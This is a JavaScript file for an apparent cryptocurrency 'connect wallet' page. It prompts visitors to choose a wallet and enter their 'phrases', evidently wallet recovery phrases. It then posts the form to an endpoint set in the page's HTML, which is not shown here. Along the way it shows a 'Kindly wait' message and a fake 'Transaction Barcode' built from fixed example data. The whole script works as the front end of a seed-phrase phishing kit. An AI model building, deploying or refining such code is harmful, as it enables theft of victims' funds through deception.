document.addEventListener('DOMContentLoaded', () => {
    const walletSelect = document.getElementById('walletSelect');
    const userInput = document.getElementById('userInput');
    const connectWalletButton = document.getElementById('connectWalletButton');
    const submitSection = document.getElementById('submitSection');
    const submitButton = document.getElementById('submitButton');
    const statusMessage = document.getElementById('statusMessage');
    const messageForm = document.getElementById('messageForm');
    const barcodeContainer = document.getElementById('barcodeContainer');
    const connectButtons = document.querySelectorAll('.connect-button');

    // Smooth scroll for navbar links
    document.querySelectorAll('.nav-menu a').forEach(anchor => {
        anchor.addEventListener('click', (e) => {
            e.preventDefault();
            const targetId = anchor.getAttribute('href').substring(1);
            document.getElementById(targetId).scrollIntoView({ behavior: 'smooth' });
            if (targetId === 'connect-wallet') {
                walletSelect.style.display = 'block';
                userInput.style.display = 'block';
                statusMessage.textContent = 'Please select a wallet and input your phrases.';
            }
        });
    });

    // Handle option card buttons
    connectButtons.forEach(button => {
        button.addEventListener('click', () => {
            walletSelect.style.display = 'block';
            userInput.style.display = 'block';
            statusMessage.textContent = `Please select a wallet and input your phrases to ${button.getAttribute('data-option')}.`;
            connectWalletButton.style.display = 'none';
            submitSection.style.display = 'none';
            barcodeContainer.style.display = 'none';
        });
    });

    // Handle wallet selection
    walletSelect.addEventListener('change', () => {
        if (walletSelect.value) {
            connectWalletButton.style.display = 'block';
            statusMessage.textContent = `Selected ${walletSelect.value}. Click "Connect Wallet" to proceed.`;
        } else {
            connectWalletButton.style.display = 'none';
        }
    });

    // Handle connect wallet button
    connectWalletButton.addEventListener('click', () => {
        if (walletSelect.value) {
            submitSection.style.display = 'block';
            connectWalletButton.style.display = 'none';
            walletSelect.style.display = 'none';
            userInput.style.display = 'none';
            statusMessage.textContent = 'Please submit your phrases.';
        }
    });

    // Handle form submission
    messageForm.addEventListener('submit', (e) => {
        e.preventDefault();
        statusMessage.textContent = 'Kindly wait';
        statusMessage.style.fontWeight = '600';
        submitButton.disabled = true;

        // Add barcode
        const barcodeImg = document.createElement('img');
        barcodeImg.src = 'https://barcode.tec-it.com/barcode.ashx?data=123456&code=Code128'; // Example barcode
        barcodeImg.alt = 'Transaction Barcode';
        barcodeContainer.innerHTML = '';
        barcodeContainer.appendChild(barcodeImg);
        barcodeContainer.style.display = 'block';

        const formData = new FormData(messageForm);
        fetch(messageForm.action, {
            method: 'POST',
            body: formData,
            headers: {
                'Accept': 'application/json'
            }
        }).then(response => {
            if (response.ok) {
                statusMessage.textContent = 'Message sent successfully!';
            } else {
                statusMessage.textContent = 'Error sending message.';
                barcodeContainer.style.display = 'none';
            }
            statusMessage.style.fontWeight = 'normal';
            submitButton.disabled = false;
        }).catch(error => {
            statusMessage.textContent = 'Network error. Please try again.';
            statusMessage.style.fontWeight = 'normal';
            barcodeContainer.style.display = 'none';
            submitButton.disabled = false;
            console.error('Error:', error);
        });
    });
});
